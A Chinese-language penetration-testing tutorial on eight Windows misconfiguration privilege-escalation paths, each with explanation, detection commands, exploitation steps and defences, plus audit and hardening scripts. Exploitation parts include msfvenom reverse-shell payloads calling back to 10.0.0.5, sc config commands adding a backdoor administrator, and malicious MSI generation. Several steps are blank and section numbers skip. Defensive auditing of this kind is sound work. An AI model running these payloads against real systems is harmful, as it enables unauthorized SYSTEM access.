1. 导言：为什么不用 exp 也能提权

在真实的内网渗透和红队评估中，最有效的提权方式往往不是利用最新的内核漏洞（0day/exp），而是利用运维人员在日常配置中遗留的"配置后门"。这些配置问题不是软件缺陷，而是人为的管理疏忽——它们广泛存在于企业环境中，原因有三：

第一，便利性优先。 运维人员为了快速部署服务，经常以 SYSTEM 权限运行服务，却忽略了服务路径、文件权限和注册表权限的安全加固。一个"能用就行"的心态留下了大量可被利用的配置缺陷。

第二，缺乏安全基线。 许多企业没有建立完善的 Windows 安全配置基线（Security Baseline），缺少对服务权限、注册表权限、计划任务权限的系统性审计。配置错误可以在系统中存在数年而不被发现。

第三，补丁管不了配置。 传统补丁管理只能修复软件漏洞，无法修复配置错误。即使系统安装了所有安全补丁，一个可写服务路径或一个 AlwaysInstallElevated 注册表键仍然可以让攻击者轻松提权。

本文将系统性地拆解 8 种最常见的配置类提权路径，每种路径都包含原理详解、检测方法、完整 PoC 和防御措施。

3. 路径一：未加引号的服务路径

3.1 原理详解

Windows 的 CreateProcess 函数在解析可执行文件路径时，如果路径包含空格且未用双引号包裹，会按照从短到长的顺序依次尝试解析路径。这是 Windows 为了兼容旧版程序而保留的行为，但也成为了一个经典的提权向量。

例如，服务路径 C:\Program Files\My Service\service.exe（未加引号）会被 Windows 按以下顺序解析：

尝试1: C:\Program.exe                    ← 如果存在, 执行此文件!
尝试2: C:\Program Files\My.exe            ← 如果存在, 执行此文件!
尝试3: C:\Program Files\My Service\service.exe  ← 最终目标

解析逻辑: 遇到空格时, 将空格前的部分作为可执行文件名尝试加载
         如果加载失败, 继续向后扩展直到完整路径

如果该服务以 SYSTEM 权限运行，且 C:\Program Files\ 目录对普通用户可写，攻击者可以在该目录放置一个名为 Program.exe 的恶意程序。当服务启动时，Windows 会先尝试执行 C:\Program.exe，从而以 SYSTEM 权限运行攻击者的代码。

3.2 检测方法

:: 方法1: 使用 sc qc 逐个检查服务路径
:: 查看服务的 BINARY_PATH_NAME 是否包含空格且未加引号
sc qc "服务名"

:: 示例输出:
:: BINARY_PATH_NAME   : C:\Program Files\My Service\service.exe
::                       ^ 注意: 路径未加引号且包含空格!
::
:: 正确配置应为:
:: BINARY_PATH_NAME   : "C:\Program Files\My Service\service.exe"

:: 方法2: 批量检查所有服务的路径
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

:: 方法3: 使用 wmic 筛选未加引号且包含空格的路径
wmic service get name,pathname | findstr /i ".exe" | findstr /v "^\"" | findstr /i " "

:: 方法4: PowerShell 检测脚本
powershell -Command "Get-WmiObject win32_service | Select-Object Name, DisplayName, State, PathName | Where-Object { $_.PathName -ne $null -and $_.PathName -notmatch '^\"' -and $_.PathName -match ' ' } | Format-Table -AutoSize"

3.3 利用步骤

4. 路径二：可写的服务二进制文件路径

4.1 原理详解

即使服务路径正确加了引号，如果服务二进制文件（BINARY_PATH_NAME）所在的目录或文件本身对普通用户可写，攻击者可以直接替换服务可执行文件。当服务重启时（无论是手动重启还是因崩溃触发的自动恢复），恶意程序就会以服务配置的权限（通常是 SYSTEM）执行。

这种配置错误通常发生在以下场景： - 第三方软件安装在非标准目录（如 C:\Apps\），且目录权限未加固 - 运维人员手动创建的服务，二进制文件放在了用户可写目录 - 开发/测试环境遗留的服务配置被带到生产环境

4.2 检测方法

:: 方法1: 使用 accesschk 批量检查服务目录权限
:: 检查所有自动启动服务的二进制文件所在目录
for /f "tokens=2 delims=:=" %%a in ('sc qc ^| findstr BINARY_PATH_NAME') do (
    echo %%a
)

:: 方法2: accesschk 检查特定用户组对服务路径的写权限
accesschk.exe -uwcqv "Authenticated Users" * /accepteula

:: 方法3: 检查服务二进制文件本身的ACL
sc qc "TargetService"
:: 获取 binPath 后:
icacls "C:\path\to\service.exe"
icacls "C:\path\to\"  :: 检查目录权限

:: 方法4: PowerShell 批量检测
powershell -Command "
$services = Get-WmiObject win32_service | Where-Object { $_.PathName -ne $null }
foreach ($svc in $services) {
    $path = $svc.PathName -replace '^\"', '' -replace '\".*', '' -replace ' .*', ''
    $dir = Split-Path $path -Parent
    if ($dir -and (Test-Path $dir)) {
        $acl = Get-Acl $dir
        foreach ($rule in $acl.Access) {
            if ($rule.IdentityReference -match 'Users|Everyone' -and $rule.FileSystemRights -match 'Write|Modify|FullControl') {
                Write-Host \"[!] 可写: $dir ($($svc.Name))\" -ForegroundColor Red
            }
        }
    }
}
"

:: Step 1: 发现可写服务目录

:: BINARY_PATH_NAME : "C:\Apps\backup\backup.exe"
:: START_TYPE       : 2 AUTO_START

:: Step 2: 确认目录可写

:: 输出: RW Users
:: 表示 Users 组对 C:\Apps\backup\ 有读写权限

:: Step 3: 备份原始服务文件(可选, 用于后续恢复)

:: Step 4: 生成恶意替换程序
:: 反弹 shell:

:: 或添加用户:
:: msfvenom -p windows/exec CMD='net user hacker P@ss /add && net localgroup administrators hacker /add' -f exe -o "C:\Apps\backup\backup.exe"

:: Step 5: 监听

:: Step 6: 重启服务触发执行

sc start "BackupService"

:: 如果服务配置了恢复策略(崩溃自动重启), 可以直接终止进程:

:: Step 7: 获得 SYSTEM shell

:: 1. 修复目录权限: 仅 SYSTEM 和 Administrators 可写

5. 路径三：弱服务权限配置

5.1 原理详解

Windows 服务的访问控制由 SDDL（Security Descriptor Definition Language）字符串定义。服务的安全描述符控制了谁可以查询、启动、停止或修改服务配置。如果普通用户对某个以高权限（SYSTEM）运行的服务拥有 SERVICE_CHANGE_CONFIG 权限，攻击者可以修改服务的 binPath 指向任意可执行文件，然后重启服务实现提权。

服务的安全描述符中关键的权限位包括：

服务权限位说明:
  SC_MANAGER_CONNECT          (0x0001)  连接服务管理器
  SC_MANAGER_CREATE_SERVICE   (0x0002)  创建服务
  SC_MANAGER_ENUMERATE_SERVICE(0x0004)  枚举服务
  SERVICE_QUERY_CONFIG        (0x0001)  查询服务配置
  SERVICE_CHANGE_CONFIG       (0x0002)  修改服务配置 ← 关键提权权限!
  SERVICE_QUERY_STATUS        (0x0004)  查询服务状态
  SERVICE_START               (0x0010)  启动服务
  SERVICE_STOP                (0x0020)  停止服务
  SERVICE_ALL_ACCESS          (0xF01FF)  完全控制

5.2 检测方法

:: 方法1: 使用 sc sdshow 查看服务安全描述符
sc sdshow "TargetService"
:: 输出 SDDL 字符串, 例如:
:: D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
::
:: SDDL 解读:
::   A = Allow (允许)
::   关键权限字母:
::     RP = SERVICE_START (启动)
::     WP = SERVICE_CHANGE_CONFIG (修改配置) ← 危险!
::     DT = SERVICE_PAUSE_CONTINUE
::     LO = SERVICE_QUERY_STATUS
::     CR = SERVICE_USER_DEFINED_CONTROL
::     CC = SERVICE_QUERY_CONFIG
::     LC = SERVICE_ENUMERATE_DEPENDENTS
::     SW = SERVICE_STOP
::     RC = READ_CONTROL
::     SD = DELETE
::     WD = WRITE_DAC
::     WO = WRITE_OWNER
::
::   末尾的 SID 缩写:
::     SY = SYSTEM
::     BA = Administrators
::     IU = Interactive Users (交互式用户) ← 如果IU有WP权限则可利用
::     SU = Service Users
::
:: 如果 Interactive Users (IU) 或 Users 组拥有 WP 权限 → 可利用!

:: 方法2: 使用 accesschk 批量检查
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
:: 输出有 "w" (write) 权限的服务即为可利用目标

:: 方法3: 检查特定服务
accesschk.exe -ucqv "Authenticated Users" "TargetService"

:: 方法4: PowerShell 检查服务权限
powershell -Command "
Get-Service | ForEach-Object {
    $sd = (Get-WmiObject Win32_Service -Filter \"Name='$($_.Name)'\").__PATH
    # 使用 sc sdshow 获取 SDDL
    $sddl = (sc sdshow $_.Name)[1]
    if ($sddl -match 'WP.*;;IU|WP.*;;BU|WP.*;;WD') {
        Write-Host \"[!] $($_.Name): 可能存在弱权限\" -ForegroundColor Red
    }
}
"

5.3 利用步骤

:: Step 1: 确认对目标服务有 CHANGE_CONFIG 权限
sc sdshow "VulnSvc"
:: 确认 SDDL 中普通用户组有 WP 权限

:: Step 2: 修改服务 binPath 为提权命令
:: 方式A: 直接添加用户
sc config "VulnSvc" binPath= "cmd.exe /c net user hacker P@ssw0rd /add & net localgroup administrators hacker /add"

:: 方式B: 指向恶意 EXE
sc config "VulnSvc" binPath= "C:\Temp\evil.exe"

:: Step 3: 重启服务执行提权命令
sc stop "VulnSvc"
sc start "VulnSvc"

:: 如果是方式A(添加用户), 服务会启动失败但命令已执行:
:: "服务未启动" → 但 net user 命令已成功

:: Step 4: 验证提权
net user hacker
:: 确认用户已添加

:: Step 5: 使用新管理员账户登录
runas /user:hacker cmd.exe

:: 方式B(恶意EXE)的完整流程:
:: 生成恶意EXE (Meterpreter reverse shell)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4446 -f exe -o C:\Temp\evil.exe

:: 修改服务路径
sc config "VulnSvc" binPath= "C:\Temp\evil.exe"

:: 重启服务
sc stop "VulnSvc" && sc start "VulnSvc"

:: 在 Meterpreter handler 中获得 SYSTEM 会话

5.4 防御措施

:: 1. 修复服务权限: 移除普通用户的 CHANGE_CONFIG 权限
sc sdset "VulnSvc" D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
:: 上述 SDDL: SYSTEM 和 Administrators 完全控制, 普通用户仅查询/启动权限

:: 2. 使用组策略统一管理服务权限

6. 路径四：AlwaysInstallElevated 注册表键

6.1 原理详解

Windows Installer（MSI）支持一种"提升安装"模式。当注册表中 AlwaysInstallElevated 键值设为 1 时，任何 MSI 安装包都会以 SYSTEM 权限执行，而不需要用户具有管理员权限，也不会弹出 UAC 提示。

这个功能原本是为了方便企业部署软件而设计的，但如果在用户级别（HKCU）也启用了此设置，任何普通用户都可以通过 msiexec 安装任意 MSI 包并以 SYSTEM 权限执行其中的代码。

需要同时满足以下两个注册表键都设为 1：

HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1 (DWORD)
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1 (DWORD)

如果只有 HKLM 为 1 而 HKCU 为 0, MSI 不会以提升权限安装
两个键必须同时为 1 才能触发提权

6.2 检测方法

:: 检查 HKLM 键
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: 如果输出: AlwaysInstallElevated    REG_DWORD    0x1 → 已启用

:: 检查 HKCU 键
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: 如果输出: AlwaysInstallElevated    REG_DWORD    0x1 → 已启用

:: 两个都为 0x1 时, 可利用!

:: PowerShell 检测
powershell -Command "
\$hklm = (Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' -ErrorAction SilentlyContinue).AlwaysInstallElevated
\$hkcu = (Get-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' -ErrorAction SilentlyContinue).AlwaysInstallElevated
if (\$hklm -eq 1 -and \$hkcu -eq 1) {
    Write-Host '[!] AlwaysInstallElevated 已启用! 可提权!' -ForegroundColor Red
} else {
    Write-Host '[-] AlwaysInstallElevated 未启用或仅部分启用'
}
"

6.3 利用步骤

# Step 1: 在攻击机上生成恶意 MSI 包
# 方式A: 添加管理员用户
msfvenom -p windows/exec CMD='net user hacker P@ssw0rd /add & net localgroup administrators hacker /add' -f msi -o /tmp/evil.msi

# 方式B: 反弹 shell (Meterpreter)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4447 -f msi -o /tmp/evil.msi

# 方式C: 反弹 shell (原生)
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4447 -f msi > /tmp/evil.msi

# Step 2: 将 MSI 包传到目标机器
# 通过 SMB / HTTP / 已有 shell 上传

7. 路径五：注册表键值劫持

7.1 原理详解

7.1.1 Image File Execution Options (IFEO) Debugger 劫持

IFEO 是 Windows 的一个调试功能。当为目标程序设置 Debugger 键值时，Windows 在启动目标程序时会改为启动 Debugger 指定的程序，并将原程序路径作为参数传递。如果目标程序以高权限运行（如通过辅助功能 sethc.exe），攻击者可以将 Debugger 指向恶意程序。

IFEO 劫持原理:

正常流程:
  用户按 Shift 5次 → sethc.exe (以 SYSTEM 运行, 登录屏幕前)

劫持后:
  用户按 Shift 5次
    → Windows 查询 HKLM\...\Image File Execution Options\sethc.exe\Debugger
    → 发现 Debugger = "C:\evil.exe"
    → 执行: C:\evil.exe sethc.exe
    → evil.exe 以 SYSTEM 权限运行 (因为 sethc 在登录屏幕以 SYSTEM 运行)

7.1.2 粘滞键劫持

粘滞键（Sticky Keys，sethc.exe）是最常见的 IFEO 劫持目标，因为它可以在登录屏幕（未认证状态下）触发，且以 SYSTEM 权限运行。经典手法是将 sethc.exe 替换为 cmd.exe（需要文件系统写权限），或通过 IFEO Debugger 重定向。

7.2 检测方法

:: 方法1: 检查 IFEO 中的 Debugger 键值
:: 列出所有 IFEO 条目
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" /s /v Debugger

:: 检查特定目标 (sethc, utilman, osk, magnify, narrator, DisplaySwitch)
for %target in (sethc.exe utilman.exe osk.exe Magnify.exe Narrator.exe DisplaySwitch.exe) do (
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%target" /v Debugger 2>nul
)

:: 方法2: 检查 sethc.exe 是否被替换
:: 原始 sethc.exe 大小约 53KB, 位于 C:\Windows\System32\
dir C:\Windows\System32\sethc.exe
fc /b C:\Windows\System32\sethc.exe C:\Windows\System32\cmd.exe
:: 如果 sethc.exe 和 cmd.exe 二进制相同 → 已被替换

:: 方法3: PowerShell 批量检测 IFEO
powershell -Command "
\$ifeoBase = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options'
Get-ChildItem \$ifeoBase | ForEach-Object {
    \$debugger = (Get-ItemProperty \$_.PSPath -ErrorAction SilentlyContinue).Debugger
    if (\$debugger) {
        Write-Host \"[!] IFEO 劫持: \$(\$_.PSChildName) → \$debugger\" -ForegroundColor Red
    }
}
"

:: 方法4: 检查辅助功能可执行文件的完整性

8. 路径六：计划任务滥用

8.1 原理详解

Windows 计划任务（Scheduled Tasks）可以配置为以 SYSTEM 或其他高权限账户运行。如果计划任务引用的可执行文件路径对普通用户可写，攻击者可以替换该可执行文件，等待计划任务按计划触发时以高权限执行恶意代码。

计划任务的利用与可写服务路径类似，但有两个关键区别： 1. 计划任务可能不会立即执行，攻击者需要等待触发时间，或找到手动触发的方式 2. 计划任务的触发条件更灵活（时间触发、登录触发、空闲触发等），覆盖面更广

8.2 检测方法

:: 方法1: 列出所有计划任务及其执行账户和路径
schtasks /query /fo LIST /v | findstr /i "TaskName Run As User Task To Run"

:: 方法2: 导出详细计划任务信息到文件
schtasks /query /fo LIST /v > all_tasks.txt

:: 方法3: PowerShell 检测高权限运行且路径可写的计划任务
powershell -Command "
Get-ScheduledTask | ForEach-Object {
    \$task = \$_
    \$info = Get-ScheduledTaskInfo \$task.TaskName -TaskPath \$task.TaskPath
    foreach (\$action in \$task.Actions) {
        if (\$action.Execute) {
            \$exePath = \$action.Execute
            \$dir = Split-Path \$exePath -Parent
            if (\$dir -and (Test-Path \$dir)) {
                \$acl = Get-Acl \$dir -ErrorAction SilentlyContinue
                if (\$acl) {
                    foreach (\$rule in \$acl.Access) {
                        if (\$rule.IdentityReference -match 'Users|Everyone' -and \$rule.FileSystemRights -match 'Write|Modify') {
                            \$principal = \$task.Principal.UserId
                            if (\$task.Principal.RunLevel -eq 'Highest' -or \$principal -match 'SYSTEM') {
                                Write-Host \"[!] 可写计划任务: \$(\$task.TaskName) | 路径: \$exePath | 运行身份: \$principal\" -ForegroundColor Red
                            }
                        }
                    }
                }
            }
        }
    }
}
"

:: 方法4: 检查特定计划任务的详细信息
schtasks /query /tn "\TaskName" /fo LIST /v

9. 路径七：DLL 劫持

9.1 原理详解

当 Windows 进程加载 DLL 时，按照固定的搜索顺序查找：

DLL 搜索顺序 (默认 SafeDllSearchMode 启用时):
  1. 应用程序所在目录
  2. System32 目录 (C:\Windows\System32\)
  3. 16位系统目录 (C:\Windows\System\)
  4. Windows 目录 (C:\Windows\)
  5. 当前工作目录
  6. PATH 环境变量中的目录

如果高权限进程(以SYSTEM运行的服务/计划任务)在其所在目录
加载一个不存在的DLL, 攻击者可以在该目录放置同名恶意DLL

如果以 SYSTEM 权限运行的进程尝试加载一个不存在于系统目录的 DLL，且进程所在目录对普通用户可写，攻击者可以在该目录放置恶意 DLL，进程加载时就会执行恶意代码。

9.2 检测方法

:: 方法1: 使用 Process Monitor (ProcMon) 监控 DLL 加载
:: 设置过滤器:
::   Operation = CreateFile
::   Result = NAME NOT FOUND
::   Path ends with .dll
::   Process Name = <目标高权限进程>

:: 方法2: 检查高权限进程的可执行文件目录权限
:: 先找到以 SYSTEM 运行的进程
tasklist /v /fi "USERNAME eq NT AUTHORITY\SYSTEM"

:: 检查进程所在目录权限
accesschk.exe -uwdqs "Users" "C:\Program Files\TargetApp\"

:: 方法3: 使用 PowerShell 自动化 DLL 劫持检测
powershell -Command "
# 需要安装 Sysinternals ProcDump 或使用 .NET 反射
# 简化版: 检查 SYSTEM 进程目录权限
\$systemProcs = Get-WmiObject Win32_Process | Where-Object {
    \$_.GetOwner().User -eq 'SYSTEM' -or \$_.GetOwner().User -eq \$null
}
foreach (\$proc in \$systemProcs) {
    \$exePath = \$proc.ExecutablePath
    if (\$exePath) {
        \$dir = Split-Path \$exePath -Parent
        if (\$dir -and (Test-Path \$dir)) {
            \$acl = Get-Acl \$dir
            foreach (\$rule in \$acl.Access) {
                if (\$rule.IdentityReference -match 'Users|Everyone' -and \$rule.FileSystemRights -match 'Write') {
                    Write-Host \"[!] 可写DLL目录: \$dir (进程: \$(\$proc.Name))\" -ForegroundColor Red
                }
            }
        }
    }
}
"

10. 路径八：令牌权限滥用

10.1 原理详解

Windows 令牌（Token）中包含的权限（Privileges）决定了进程能执行哪些特权操作。某些权限即使在不完整的令牌（非管理员令牌）中也可能存在，这些权限可以被滥用来实现提权。

关键可滥用权限:

  SeImpersonatePrivilege
    → 可以模拟客户端令牌
    → Potato 系列提权 (JuicyPotato/RoguePotato/PrintSpoofer/CoercedPotato)
    → 原理: 诱骗高权限服务连接到攻击者的命名管道/RPC端点
            → 获取 SYSTEM 令牌 → 模拟 → 创建 SYSTEM 进程

  SeDebugPrivilege
    → 可以打开任何进程(包括SYSTEM进程)的句柄
    → 注入 SYSTEM 进程 (如 winlogon.exe, lsass.exe)
    → 在 SYSTEM 进程中执行代码 → 等价于 SYSTEM 权限

  SeAssignPrimaryTokenPrivilege
    → 可以为新进程分配主令牌
    → 配合 SeIncreaseQuotaPrivilege 创建高权限进程

  SeTcbPrivilege
    → Act as part of the operating system
    → 可直接调用 LsaLogonUser 创建 SYSTEM 令牌
    → 最强大的权限, 几乎等价于 SYSTEM

  SeBackupPrivilege / SeRestorePrivilege
    → 可读写任意文件(绕过 ACL)
    → 读取 SAM/SYSTEM 注册表 hive → 导出密码哈希
    → 或读取其他敏感文件

10.2 检测方法

:: 确保:
::   "Impersonate a client after authentication" → 仅 Administrators, SERVICE, LOCAL SERVICE, NETWORK SERVICE

:: 2. 导出并审计当前权限分配策略

以下是一个综合性的 PowerShell 检测脚本，覆盖本文所述的全部 8 种配置问题：

# ============================================================
# Windows 配置后门提权综合检测脚本
# 检测8种常见配置提权路径
# ============================================================

#Requires -Version 5.0

$ErrorActionPreference = "SilentlyContinue"

Write-Host ""
Write-Host "============================================" -ForegroundColor Cyan
Write-Host "  Windows 配置后门提权检测脚本 v1.0" -ForegroundColor Cyan
Write-Host "  检测8种常见配置提权路径" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan
Write-Host ""

$findings = @()

# ------------------------------------------------------------
# 检测1: 未加引号的服务路径
# ------------------------------------------------------------
Write-Host "[*] 检测1: 未加引号的服务路径..." -ForegroundColor Yellow
$services = Get-WmiObject Win32_Service | Where-Object {
    $_.PathName -ne $null -and
    $_.PathName -notmatch '^"' -and
    $_.PathName -match ' ' -and
    $_.PathName -match '\.exe'
}

foreach ($svc in $services) {
    $path = $svc.PathName -replace ' .*$', '' -replace '^"', ''
    $dir = Split-Path $path -Parent
    if ($dir -and (Test-Path $dir)) {
        $acl = Get-Acl $dir
        foreach ($rule in $acl.Access) {
            if ($rule.IdentityReference -match 'Users|Everyone' -and
                $rule.FileSystemRights -match 'Write|Modify|FullControl') {
                $msg = "[!] 未加引号服务路径: $($svc.Name) → $path (目录可写: $dir)"
                Write-Host $msg -ForegroundColor Red
                $findings += $msg
                break
            }
        }
    }
}

# ------------------------------------------------------------
# 检测2: 可写的服务二进制文件路径
# ------------------------------------------------------------
Write-Host "`n[*] 检测2: 可写的服务二进制文件路径..." -ForegroundColor Yellow
$services = Get-WmiObject Win32_Service | Where-Object { $_.PathName -ne $null }
foreach ($svc in $services) {
    $path = $svc.PathName -replace '^"', '' -replace '"\s*.*$', '' -replace ' -.*$', '' -replace ' /.*$', ''
    $dir = Split-Path $path -Parent
    if ($dir -and (Test-Path $dir) -and (Test-Path $path)) {
        # 检查文件权限
        $fileAcl = Get-Acl $path
        foreach ($rule in $fileAcl.Access) {
            if ($rule.IdentityReference -match 'Users|Everyone' -and
                $rule.FileSystemRights -match 'Write|Modify|FullControl') {
                $msg = "[!] 可写服务文件: $($svc.Name) → $path"
                Write-Host $msg -ForegroundColor Red
                $findings += $msg
                break
            }
        }
    }
}

# ------------------------------------------------------------
# 检测3: 弱服务权限配置
# ------------------------------------------------------------
Write-Host "`n[*] 检测3: 弱服务权限配置..." -ForegroundColor Yellow
$allServices = Get-Service
foreach ($svc in $allServices) {
    $sddl = (sc.exe sdshow $svc.Name)[1]
    if ($sddl -match 'WP.*;;IU|WP.*;;BU|WP.*;;WD|FA.*;;IU|FA.*;;BU') {
        $msg = "[!] 弱服务权限: $($svc.Name) → SDDL: $sddl"
        Write-Host $msg -ForegroundColor Red
        $findings += $msg
    }
}

# ------------------------------------------------------------
# 检测4: AlwaysInstallElevated
# ------------------------------------------------------------
Write-Host "`n[*] 检测4: AlwaysInstallElevated 注册表键..." -ForegroundColor Yellow
$hklm = (Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' -ErrorAction SilentlyContinue).AlwaysInstallElevated
$hkcu = (Get-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' -ErrorAction SilentlyContinue).AlwaysInstallElevated
if ($hklm -eq 1 -and $hkcu -eq 1) {
    $msg = "[!] AlwaysInstallElevated 已启用! (HKLM=$hklm, HKCU=$hkcu) → MSI以SYSTEM执行!"
    Write-Host $msg -ForegroundColor Red
    $findings += $msg
} else {
    Write-Host "    [-] AlwaysInstallElevated 未启用 (HKLM=$hklm, HKCU=$hkcu)" -ForegroundColor Green
}

# ------------------------------------------------------------
# 检测5: 注册表键值劫持 (IFEO)
# ------------------------------------------------------------
Write-Host "`n[*] 检测5: IFEO 注册表劫持..." -ForegroundColor Yellow
$ifeoBase = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options'
$ifeoKeys = Get-ChildItem $ifeoBase -ErrorAction SilentlyContinue
$accessibilityTools = @('sethc.exe','utilman.exe','osk.exe','Magnify.exe','Narrator.exe','DisplaySwitch.exe')
foreach ($key in $ifeoKeys) {
    $debugger = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).Debugger
    if ($debugger) {
        $severity = if ($accessibilityTools -contains $key.PSChildName) { "高危" } else { "中危" }
        $msg = "[!] IFEO 劫持 ($severity): $($key.PSChildName) → Debugger: $debugger"
        Write-Host $msg -ForegroundColor Red
        $findings += $msg
    }
}

# ------------------------------------------------------------
# 检测6: 计划任务滥用
# ------------------------------------------------------------
Write-Host "`n[*] 检测6: 计划任务可写路径..." -ForegroundColor Yellow
$tasks = Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object { $_.State -ne 'Disabled' }
foreach ($task in $tasks) {
    foreach ($action in $task.Actions) {
        if ($action.Execute) {
            $exePath = $action.Execute -replace '"', ''
            $dir = Split-Path $exePath -Parent
            if ($dir -and (Test-Path $dir)) {
                $acl = Get-Acl $dir
                foreach ($rule in $acl.Access) {
                    if ($rule.IdentityReference -match 'Users|Everyone' -and
                        $rule.FileSystemRights -match 'Write|Modify|FullControl') {
                        $runAs = if ($task.Principal.UserId) { $task.Principal.UserId } else { $task.Principal.GroupId }
                        $msg = "[!] 可写计划任务: $($task.TaskName) → $exePath (运行身份: $runAs)"
                        Write-Host $msg -ForegroundColor Red
                        $findings += $msg
                        break
                    }
                }
            }
        }
    }
}

# ------------------------------------------------------------
# 检测7: DLL 劫持风险 (SYSTEM进程可写目录)
# ------------------------------------------------------------
Write-Host "`n[*] 检测7: SYSTEM进程可写目录 (DLL劫持风险)..." -ForegroundColor Yellow
$systemProcs = Get-WmiObject Win32_Process | Where-Object {
    $_.ExecutablePath -ne $null -and
    $_.ExecutablePath -notmatch 'System32|SysWOW64|Windows\\'
}
$checkedDirs = @{}
foreach ($proc in $systemProcs) {
    $dir = Split-Path $proc.ExecutablePath -Parent
    if ($dir -and -not $checkedDirs.ContainsKey($dir) -and (Test-Path $dir)) {
        $checkedDirs[$dir] = $true
        $acl = Get-Acl $dir
        foreach ($rule in $acl.Access) {
            if ($rule.IdentityReference -match 'Users|Everyone' -and
                $rule.FileSystemRights -match 'Write|Modify|FullControl') {
                $msg = "[!] 可写进程目录(DLL劫持): $dir (进程: $($proc.Name))"
                Write-Host $msg -ForegroundColor Red
                $findings += $msg
                break
            }
        }
    }
}

# ------------------------------------------------------------
# 检测8: 令牌权限滥用
# ------------------------------------------------------------
Write-Host "`n[*] 检测8: 危险令牌权限..." -ForegroundColor Yellow
$privs = whoami /priv
$dangerousPrivs = @{
    'SeImpersonatePrivilege'  = '可进行Potato系列提权'
    'SeDebugPrivilege'        = '可注入SYSTEM进程'
    'SeTcbPrivilege'          = '可直接创建SYSTEM令牌'
    'SeAssignPrimaryTokenPrivilege' = '可分配主令牌'
    'SeBackupPrivilege'       = '可读取任意文件(SAM/SYSTEM)'
    'SeRestorePrivilege'      = '可写入任意文件'
}
foreach ($priv in $dangerousPrivs.Keys) {
    if ($privs -match $priv) {
        $msg = "[!] 危险权限存在: $priv ($($dangerousPrivs[$priv]))"
        Write-Host $msg -ForegroundColor Red
        $findings += $msg
    }
}

# ------------------------------------------------------------
# 汇总报告
# ------------------------------------------------------------
Write-Host "`n============================================" -ForegroundColor Cyan
Write-Host "  检测完成 - 汇总报告" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan
Write-Host "发现问题数量: $($findings.Count)" -ForegroundColor $(if ($findings.Count -gt 0) { 'Red' } else { 'Green' })
Write-Host ""

if ($findings.Count -gt 0) {
    Write-Host "发现的问题清单:" -ForegroundColor Red
    for ($i = 0; $i -lt $findings.Count; $i++) {
        Write-Host "  $($i + 1). $($findings[$i])" -ForegroundColor Yellow
    }
} else {
    Write-Host "  未发现配置后门提权路径" -ForegroundColor Green
}

# 导出报告到文件
$reportPath = "$env:TEMP\privesc_audit_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
$findings | Out-File -FilePath $reportPath -Encoding UTF8
Write-Host "`n报告已保存: $reportPath" -ForegroundColor Cyan

15. 防御方案

15.1 安全基线配置

企业应建立完善的 Windows 安全配置基线，以下是最关键的配置项：

# ============================================================
# Windows 安全基线加固脚本
# ============================================================

# 1. 禁用 AlwaysInstallElevated
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated /t REG_DWORD /d 0 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated /t REG_DWORD /d 0 /f

# 2. 清理所有 IFEO Debugger 键值
$ifeoPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
Get-ChildItem $ifeoPath | ForEach-Object {
    $debugger = (Get-ItemProperty $_.PSPath).Debugger
    if ($debugger) {
        Remove-ItemProperty -Path $_.PSPath -Name "Debugger" -Force
        Write-Host "已清除 IFEO Debugger: $($_.PSChildName)"
    }
}

# 3. 修复所有服务路径为加引号格式
Get-WmiObject Win32_Service | ForEach-Object {
    if ($_.PathName -and $_.PathName -notmatch '^"' -and $_.PathName -match ' ') {
        $exePath = $_.PathName -replace ' .*$', ''
        $args = $_.PathName -replace [regex]::Escape($exePath), ''
        $newPath = '"' + $exePath + '"' + $args
        try {
            sc.exe config $_.Name binPath= $newPath
            Write-Host "已修复服务路径: $($_.Name)"
        } catch {
            Write-Host "修复失败: $($_.Name) - $($_.Exception.Message)"
        }
    }
}

15.3 最小权限原则

从根本上减少配置后门提权风险的最佳实践是严格遵循最小权限原则：

  1. 服务账户降权：避免使用 LocalSystem 运行服务，改用 NT SERVICE\服务名 虚拟账户或 gMSA（组托管服务账户）。虚拟账户仅有最小必要权限，即使被攻破也难以提权。

  2. 目录权限隔离：所有服务/应用程序安装目录应仅允许 SYSTEM 和 Administrators 写入，普通用户仅读取和执行权限。

  3. UAC 始终启用：确保 UAC 处于"始终通知"级别（ConsentPromptBehaviorAdmin = 2），防止静默提权。

